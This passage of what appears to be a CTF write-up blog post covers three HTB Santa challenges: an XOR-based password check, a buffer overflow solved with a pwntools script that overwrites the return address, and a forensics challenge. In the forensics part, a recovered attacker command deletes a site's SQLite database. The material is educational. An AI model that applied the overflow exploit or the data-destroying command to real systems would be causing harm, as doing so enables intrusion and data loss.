+  <span class="k">while</span> <span class="p">(</span><span class="n">local_11c</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">user_input</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_11c</span><span class="p">)</span> <span class="o">=</span>
+         <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">user_input</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_11c</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xf3</span><span class="p">;</span>
+    <span class="n">local_11c</span> <span class="o">=</span> <span class="n">local_11c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">thunk_FUN_004010e6</span><span class="p">(</span><span class="n">CHECK</span><span class="p">,</span><span class="o">&amp;</span><span class="n">user_input</span><span class="p">,</span><span class="mh">0x17</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Welcome inside..."</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Wrong password! Who are you?!?"</span><span class="p">);</span>
+  <span class="p">}</span>
+</pre></table></code></div></div><ul><li>After xoring the value ( xored input ) is compared with <code class="language-plaintext highlighter-rouge">CHECK</code> variable</ul><h2 id="solution-2">Solution<a href="#solution-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Let’s the data stored in <code class="language-plaintext highlighter-rouge">CHECK</code> variable</ul><pre><code class="language-asm">                             CHECK                                           XREF[3]:     Entry Point(*), main:004019fa(*), 
+                                                                                          main:00401a01(*)  
+        004cc0f0 bb a7 b1        undefine
+                 88 86 83 
+                 8b ac c7 
+           004cc0f0 bb              undefined1BBh                     [0]                               XREF[3]:     Entry Point(*), main:004019fa(*), 
+                                                                                                                     main:00401a01(*)  
+           004cc0f1 a7              undefined1A7h                     [1]
+           004cc0f2 b1              undefined1B1h                     [2]
+           004cc0f3 88              undefined188h                     [3]
+           004cc0f4 86              undefined186h                     [4]
+           004cc0f5 83              undefined183h                     [5]
+           004cc0f6 8b              undefined18Bh                     [6]
+           004cc0f7 ac              undefined1ACh                     [7]
+           004cc0f8 c7              undefined1C7h                     [8]
+           004cc0f9 c2              undefined1C2h                     [9]
+           004cc0fa 9d              undefined19Dh                     [10]
+           004cc0fb 87              undefined187h                     [11]
+           004cc0fc ac              undefined1ACh                     [12]
+           004cc0fd c6              undefined1C6h                     [13]
+           004cc0fe c3              undefined1C3h                     [14]
+           004cc0ff ac              undefined1ACh                     [15]
+           004cc100 9b              undefined19Bh                     [16]
+           004cc101 c7              undefined1C7h                     [17]
+           004cc102 81              undefined181h                     [18]
+           004cc103 97              undefined197h                     [19]
+           004cc104 d2              undefined1D2h                     [20]
+           004cc105 d2              undefined1D2h                     [21]
+           004cc106 8e              undefined18Eh                     [22]
+           004cc107 00              undefined100h                     [23]
+</code></pre><ul><li>Let’s store the <code class="language-plaintext highlighter-rouge">CHECK</code> values locally and <code class="language-plaintext highlighter-rouge">xor</code> it with <code class="language-plaintext highlighter-rouge">0xf3</code> to get flag</ul><h2 id="solvepy-1">solve.py<a href="#solvepy-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-py highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>
+<span class="n">check_values</span> <span class="o">=</span> <span class="s">'bb a7 b1 88 86 83 8b ac c7 c2 9d 87 ac c6 c3 ac 9b c7 81 97 d2 d2 8e 00'</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)</span>
+<span class="n">int_values</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">check_values</span><span class="p">]</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span> <span class="o">^</span> <span class="mh">0xf3</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">int_values</span><span class="p">])</span>
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</pre></table></code></div></div><h2 id="flag-1">Flag<a href="#flag-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>./giftwrap 
+
+What<span class="s1">'s the magic word? 
+HTB{upx_41nt_50_h4rd!!}ó
+Welcome inside...
+
+# flag : HTB{upx_41nt_50_h4rd!!}ó
+
+</span></pre></table></code></div></div><h1 id="mr-snowy--pwn-">Mr Snowy [ Pwn ]</h1><p><img data-src="https://user-images.githubusercontent.com/56447720/144405133-fce67fce-1a26-4b8c-8d1d-4700f372a297.png" alt="image" data-proofer-ignore></p><h2 id="solution-3">Solution<a href="#solution-3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="checksec">Checksec<a href="#checksec" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="https://user-images.githubusercontent.com/56447720/144418184-a7ce15ee-4cc8-4ffa-a5b3-681002b860b7.png" alt="image" data-proofer-ignore></p><ul><li>The <code class="language-plaintext highlighter-rouge">NX</code> is enabled which makes the stack unexecutabble<li>THe <code class="language-plaintext highlighter-rouge">PIE</code> is disabled so we dont have to find the address<li>The binary is just a simple bufferoverflow</ul><h3 id="functions-of-the-binary-has">Functions of the binary has<a href="#functions-of-the-binary-has" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="https://user-images.githubusercontent.com/56447720/144419529-fa60777f-2ee8-4d72-acd0-99e7cd4d7aba.png" alt="image" data-proofer-ignore></p><h3 id="main-function-1">Main function<a href="#main-function-1" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="https://user-images.githubusercontent.com/56447720/144418082-2035b197-9a54-474e-badf-c758bd8127fa.png" alt="image" data-proofer-ignore></p><ul><li>The main funciton after executing calls 3 functions , let’s checkout the snowman function</ul><h4 id="its-quiet-difficult-to-do-the-task-only-with-asm--ive-used-ghidra-which-has-a-feature-of-converting--almost-same--asm-back-to-the-original-c-code">It’s quiet difficult to do the task only with asm , I’ve used Ghidra which has a feature of converting ( almost same ) asm back to the original C code<a href="#its-quiet-difficult-to-do-the-task-only-with-asm--ive-used-ghidra-which-has-a-feature-of-converting--almost-same--asm-back-to-the-original-c-code" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><h3 id="snowman-function">Snowman Function<a href="#snowman-function" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>
+<span class="kt">void</span> <span class="nf">snowman</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_48</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  
+  <span class="n">printstr</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[*] This snowman looks sus..</span><span class="se">\n\n</span><span class="s">1. Investigate 🔎</span><span class="se">\n</span><span class="s">2. Let it be   ⛄</span><span class="se">\n</span><span class="s">&gt; "</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_48</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">local_48</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printstr</span><span class="p">(</span><span class="s">"[*] It</span><span class="se">\'</span><span class="s">s just a cute snowman after all, nothing to worry about..</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">color</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] Mission failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_0040161a</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_00401664</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mh">0x45</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">investigate</span><span class="p">();</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+</pre></table></code></div></div><ul><li><p>This code is basically the first part <img data-src="https://user-images.githubusercontent.com/56447720/144408636-c805745e-25eb-48a5-8e07-4c83074d5f97.png" alt="image" data-proofer-ignore></p><li><p>When option <code class="language-plaintext highlighter-rouge">1</code> is selected it calls antoher funtion : <code class="language-plaintext highlighter-rouge">investigate()</code></p></ul><h3 id="inverstigate-function">Inverstigate Function<a href="#inverstigate-function" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre><td class="rouge-code"><pre>
+<span class="kt">void</span> <span class="nf">investigate</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_48</span> <span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+  
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">printstr</span><span class="p">(</span>
+          <span class="s">"</span><span class="se">\n</span><span class="s">[!] After some investigation, you found a secret camera inside the snowman!</span><span class="se">\n\n</span><span class="s">1.Deactivate ⚠</span><span class="se">\xfe0f\n</span><span class="s">2. Break it   🔨</span><span class="se">\n</span><span class="s">&gt; "</span>
+          <span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_48</span><span class="p">,</span><span class="mh">0x108</span><span class="p">);</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">local_48</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\x1b</span><span class="s">[1;31m"</span><span class="p">);</span>
+    <span class="n">printstr</span><span class="p">(</span><span class="s">"[!] You do not know the password!</span><span class="se">\n</span><span class="s">[-] Mission failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mh">0x16</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">local_48</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\x1b</span><span class="s">[1;31m"</span><span class="p">);</span>
+    <span class="n">printstr</span><span class="p">(</span>
+            <span class="s">"[!] This metal seems unbreakable, the elves seem to have put a spell on it..</span><span class="se">\n</span><span class="s">[-]Mission failed!</span><span class="se">\n</span><span class="s">"</span>
+            <span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mh">0x16</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\x1b</span><span class="s">[1;31m"</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Mission failed!"</span><span class="p">);</span>
+  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+</pre></table></code></div></div><h3 id="theres-another-function-named-deactivate-camera">There’s another function named <code class="language-plaintext highlighter-rouge">deactivate camera</code><a href="#theres-another-function-named-deactivate-camera" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-c highlighter-rouge"><div class="code-header"> <span label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>
+<span class="kt">void</span> <span class="nf">deactivate_camera</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">acStack104</span> <span class="p">[</span><span class="mi">48</span><span class="p">];</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">local_38</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">local_30</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">local_28</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
+  
+  <span class="n">local_1c</span> <span class="o">=</span> <span class="mh">0x30</span><span class="p">;</span>
+  <span class="n">local_28</span> <span class="o">=</span> <span class="mh">0x2f</span><span class="p">;</span>
+  <span class="n">local_30</span> <span class="o">=</span> <span class="n">acStack104</span><span class="p">;</span>
+  <span class="n">local_38</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">==</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fwrite</span><span class="p">(</span><span class="s">"[-] Could not open flag.txt, please conctact an Administrator.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x3f</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mh">0x45</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">local_30</span><span class="p">,</span><span class="n">local_1c</span><span class="p">,</span><span class="n">local_38</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\x1b</span><span class="s">[1;32m"</span><span class="p">);</span>
+  <span class="n">fwrite</span><span class="p">(</span><span class="s">"[+] Here is the secret password to deactivate the camera: "</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x3a</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
+  <span class="n">fclose</span><span class="p">(</span><span class="n">local_38</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+</pre></table></code></div></div><h2 id="overflow">Overflow<a href="#overflow" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p>So we basically have to find the offset in investigation function, overflow it and set the <code class="language-plaintext highlighter-rouge">$rip</code> ( Instruction pointter ) to <code class="language-plaintext highlighter-rouge">deactivate_camera</code> function</p><li>Find OFFSET<li>Set breakpoint at <code class="language-plaintext highlighter-rouge">exit</code> in <code class="language-plaintext highlighter-rouge">investigate()</code> [ address of exit : 0x00000000004013ea ] and create a pattern to find offset</ul><p><img data-src="https://user-images.githubusercontent.com/56447720/144418424-fcdf5250-a4ce-4edc-bda1-91df1c306755.png" alt="image" data-proofer-ignore></p><ul><li>Run the program , give option <code class="language-plaintext highlighter-rouge">1</code> to go in <code class="language-plaintext highlighter-rouge">investigate</code> function</ul><p><img data-src="https://user-images.githubusercontent.com/56447720/144418694-e1b7f129-2354-4377-b280-af26893a00cb.png" alt="image" data-proofer-ignore></p><ul><li>This is how stack will look when we hit our breakpoint</ul><p><img data-src="https://user-images.githubusercontent.com/56447720/144416069-49db01c2-1f83-4bd7-a0f1-c340cb49f6e1.png" alt="image" data-proofer-ignore></p><p><img data-src="https://user-images.githubusercontent.com/56447720/144418590-d00fa329-4da0-4700-bcd5-dc64a899d5ae.png" alt="image" data-proofer-ignore></p><ul><li>So the OFFSET is 72</ul><h2 id="exploit">Exploit<a href="#exploit" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Send buffer of 72 characters<li>Add the addresss of <code class="language-plaintext highlighter-rouge">deactivate camera</code> function<li>Send the payload and get the flag</ul><h2 id="solvepy-2">Solve.py<a href="#solvepy-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-py highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># nc 134.209.30.250:30947
+</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'134.209.30.250'</span><span class="p">,</span><span class="mi">30947</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">72</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401165</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></table></code></div></div><h2 id="flag-2">Flag<a href="#flag-2" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="https://user-images.githubusercontent.com/56447720/144417152-21dc9cc1-5c83-4db1-830c-9f4db56e2360.png" alt="image" data-proofer-ignore></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="c"># Flag : HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}</span>
+</pre></table></code></div></div><h1 id="baby-apt--forensics-">baby APT [ Forensics ]</h1><p><img data-src="https://user-images.githubusercontent.com/56447720/144394496-6bd7e734-7488-44c4-9b68-ff0926e6996d.png" alt="image" data-proofer-ignore></p><h2 id="note">Note<a href="#note" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>This is unintended way to do the challenge</ul><h2 id="solution-4">Solution<a href="#solution-4" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>Strings command showed some HTTP requets</ul><p><img data-src="https://user-images.githubusercontent.com/56447720/144395334-ba542eba-cf63-45a3-9f99-18cd6cff1875.png" alt="image" data-proofer-ignore></p><ul><li>URL encoded</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">cmd</span><span class="o">=</span><span class="nb">rm</span>++%2Fvar%2Fwww%2Fhtml%2Fsites%2Fdefault%2Ffiles%2F.ht.sqlite+%26%26+echo+SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59+%3E+%2Fdev%2Fnull+2%3E%261+%26%26+ls+-al++%2Fvar%2Fwww%2Fhtml%2Fsites%2Fdefault%2Ffiles
+
+</pre></table></code></div></div><ul><li>URL decoded</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">cmd</span><span class="o">=</span><span class="nb">rm</span>  /var/www/html/sites/default/files/.ht.sqlite <span class="o">&amp;&amp;</span> <span class="nb">echo </span>SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59 <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 <span class="o">&amp;&amp;</span> <span class="nb">ls</span> <span class="nt">-al</span>  /var/www/html/sites/default/files
+
+</pre></table></code></div></div><h2 id="flag-3">Flag<a href="#flag-3" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59"</span> | <span class="nb">base64</span> <span class="nt">-d</span> 
+
+HTB<span class="o">{</span>0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n<span class="o">}</span>
+
+</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>ctf</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB Santa CTF DAY 1 - heapbytes&url=https://heapbytes.github.io/posts/DAY1/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB Santa CTF DAY 1 - heapbytes&u=https://heapbytes.github.io/posts/DAY1/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB Santa CTF DAY 1 - heapbytes&url=https://heapbytes.github.io/posts/DAY1/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Shibboleth/">Hackthebox Shibboleth Writeup</a><li><a href="/posts/DAY1/">HTB Santa CTF DAY 1 </a><li><a href="/posts/Akahack/">Akahack easy Crypto</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/doas/">doas</a> <a class="post-tag" href="/tags/dstat/">dstat</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/websockets/">websockets</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/horizonall_htb/"><div class="card-body"> <em class="timeago small" date="2022-02-06 00:00:00 +0530" >Feb 6, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox Horizontall Writeup</h3><div class="text-muted small"><p> Writeup Difficulty : Easy Port Scan 2 ports were open in this machine : 22, 80 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 └─$ nmap -p 22,80 -sC -sV horizontall.htb ...</p></div></div></a></div><div class="card"> <a href="/posts/Shibboleth/"><div class="card-body"> <em class="timeago small" date="2022-04-09 01:30:00 +0530" >Apr 9, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Shibboleth Writeup</h3><div class="text-muted small"><p> Machine name - Shibboleth ( HackTheBox ) Nmap Scan 1 2 3 4 5 6 7 8 9 10 11 12 └─$ nmap -p- -sC -sV shibboleth.htb Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-15 09:37 IST Nmap scan repor...</p></div></div></a></div><div class="card"> <a href="/posts/Backdoor_htb/"><div class="card-body"> <em class="timeago small" date="2022-04-23 00:00:00 +0530" >Apr 23, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Backdoor Writeup</h3><div class="text-muted small"><p> Machine Name - Backdoor Initial Enumeration Nmap Scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 